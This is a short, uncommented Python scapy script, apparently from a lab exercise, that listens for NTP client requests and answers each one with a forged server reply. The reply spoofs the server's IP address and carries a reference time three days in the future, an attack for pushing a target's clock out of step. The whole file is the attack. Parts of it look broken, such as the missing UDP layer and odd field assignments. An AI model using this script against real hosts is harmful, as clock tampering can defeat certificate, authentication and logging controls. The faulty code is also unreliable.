from scapy.all import IP, UDP, NTP, send, sniff
from scapy.layers.ntp import NTP
import time

server_ip = "10.10.10.12"
src_ip = "10.10.10.10"
ref_timestamp = time.time() + 259200

def send_ntp(server_ip, src_ip, ref_timestamp):
    ntp_packet = NTP()

    ntp_packet.ref = ref_timestamp
    ntp_packet.version = 3
    ntp_packet.refid = server_ip
    ntp_packet.delay = 1
    ntp_packet.disp = 16
    ntp_packet.precision = 1
    ntp_packet.poll = 4
    ntp_packet.mode = 4
    ntp_packet.id = server_ip

    ip_packet = IP(src=server_ip, dst=src_ip)

    print("Packet before sending")
    ntp_packet.show()

    send(ip_packet/ntp_packet, verbose=True)

def ntp_request(packet):
    if packet.haslayer(NTP) and packet[NTP].mode == 3:
        send_ntp(server_ip, packet[IP].src, ref_timestamp)

if __name__ == "__main__":
    sniff(filter="udp and port 123", prn=ntp_request)
